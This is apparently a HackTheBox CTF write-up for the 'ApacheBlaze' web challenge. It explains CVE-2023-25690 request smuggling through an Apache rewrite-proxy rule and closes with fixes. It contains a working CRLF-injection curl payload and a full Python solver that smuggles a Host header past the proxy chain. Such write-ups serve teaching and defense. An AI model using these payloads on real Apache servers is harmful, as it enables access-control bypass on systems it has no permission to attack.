---
title: "ApacheBlaze"
date: 2027-04-03 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, apache, http-request-smuggling, crlf-injection, cve-2023-25690, mod-proxy, cwe-113]
description: "An Easy Web challenge built on a vulnerable Apache reverse-proxy config. A RewriteRule reflects the request path into a proxied URL, so a CRLF-laden path smuggles a header into the backend — and the trick is to inject a Host header (not X-Forwarded-Host) and let a downstream proxy hop derive the trusted header for you."
---

## Overview

ApacheBlaze is an Easy **Web** challenge: an arcade-clicker site fronted by Apache `httpd 2.4.55`. A grand-prize game, `click_topia`, only returns the flag when the backend sees `X-Forwarded-Host: dev.apacheblaze.local`. The Apache config reflects the request path into a proxied backend URL, which makes it vulnerable to [CVE-2023-25690](https://nvd.nist.gov/vuln/detail/CVE-2023-25690) — [HTTP request smuggling](https://cwe.mitre.org/data/definitions/444.html) via `mod_rewrite` + `mod_proxy`. The one-line path: inject a CRLF into the proxied request and smuggle a `Host` header.

## The technique

The shipped `conf/httpd.conf` contains the textbook vulnerable pattern:

```apache
RewriteEngine on
RewriteRule "^/api/games/(.*)" "http://127.0.0.1:8080/?game=$1" [P]
```

The unanchored capture `(.*)` is **URL-decoded and reinserted** into the proxied request-target via `$1`. That is exactly the condition [CVE-2023-25690](https://nvd.nist.gov/vuln/detail/CVE-2023-25690) describes: a non-specific pattern matching user-supplied request-target data, re-inserted into the proxied request with variable substitution. A percent-encoded CRLF (`%0d%0a`) in the path therefore breaks out of the request line and injects arbitrary headers — an [improper neutralization of CRLF sequences](https://cwe.mitre.org/data/definitions/113.html).

The flag gate lives in the Flask backend:

```python
elif game == 'click_topia':
    if request.headers.get('X-Forwarded-Host') == 'dev.apacheblaze.local':
        return jsonify({'message': app.config['FLAG']}), 200
```

The request flows through two proxy hops: `:1337` (the rewrite) → `:8080` (a `mod_proxy_balancer`) → `:8081/:8082` (uwsgi Flask). The non-obvious part: **injecting `X-Forwarded-Host` directly fails.** The balancer hop adds its own `X-Forwarded-Host` value, so the backend sees `dev.apacheblaze.local, <realhost>` and the exact `==` check never matches. Instead, inject a plain `Host` header into the smuggled request — the downstream `mod_proxy` hop then *derives* `X-Forwarded-Host` from that Host, yielding an exact match.

## Solution

The payload smuggles `Host: dev.apacheblaze.local`, with a trailing `GET /SMUGGLED` to absorb Apache's appended ` HTTP/1.1\r\nHost: 127.0.0.1...` so the first request stays well-formed:

```bash
curl --path-as-is "http://<host>:<port>/api/games/click_topia%20HTTP/1.1%0d%0aHost:%20dev.apacheblaze.local%0d%0a%0d%0aGET%20/SMUGGLED"
```

`--path-as-is` is essential — it stops curl from normalizing the `%0d%0a` away. The decoded `$1` becomes `click_topia HTTP/1.1\r\nHost: dev.apacheblaze.local\r\n\r\nGET /SMUGGLED`, so the stream Apache sends to `:8080` is:

```http
GET /?game=click_topia HTTP/1.1
Host: dev.apacheblaze.local

GET /SMUGGLED HTTP/1.1
Host: 127.0.0.1:8080
```

Request 1 (`game=click_topia`, `Host: dev.apacheblaze.local`) is balanced to the backend, which derives `X-Forwarded-Host: dev.apacheblaze.local`, and the gate releases the flag (`HTB{...}`).

A self-contained raw-socket solver (no curl normalization quirks):

`solve.py`:

```python
#!/usr/bin/env python3
import sys, socket, re

def solve(host, port):
    path = ("/api/games/click_topia%20HTTP/1.1"
            "%0d%0aHost:%20dev.apacheblaze.local"
            "%0d%0a%0d%0aGET%20/SMUGGLED")
    req = (f"GET {path} HTTP/1.1\r\n"
           f"Host: {host}:{port}\r\n"
           f"Connection: close\r\n\r\n")
    s = socket.create_connection((host, port), timeout=20)
    s.sendall(req.encode())
    buf = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        buf += chunk
    s.close()
    m = re.search(rb"HTB\{[^}]+\}", buf)
    return m.group(0).decode() if m else buf.decode(errors="replace")

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 1337
    print(solve(host, port))
```

```bash
python3 solve.py <host> <port>
# HTB{...}
```

## Why it worked

Apache `httpd ≤ 2.4.55` decodes the captured rewrite variable back into the proxied request line before forwarding it. With `[P]` (proxy) and an unanchored `(.*)`, attacker-controlled CRLF survives into the upstream request and splits it. The flag gate trusted a forwarded header, and the multi-hop proxy chain *manufactured* that trusted header out of a `Host` header the attacker controlled — turning a header the front-end would have overwritten into one the back-end believed.

## Fix / defense

- Upgrade Apache `httpd` to **≥ 2.4.56**, which fixes [CVE-2023-25690](https://nvd.nist.gov/vuln/detail/CVE-2023-25690).
- Never reinsert an unanchored `(.*)` capture into a `[P]` proxy target — anchor and validate the captured group, e.g. `RewriteRule "^/api/games/([a-z_]+)$" "http://127.0.0.1:8080/?game=$1" [P]`.
- Strip or reject CR/LF in rewrite/substitution variables before proxying.
- Enforce host/header authorization at the backend on values you fully control, not on `X-Forwarded-*` headers an intermediate proxy can synthesize.
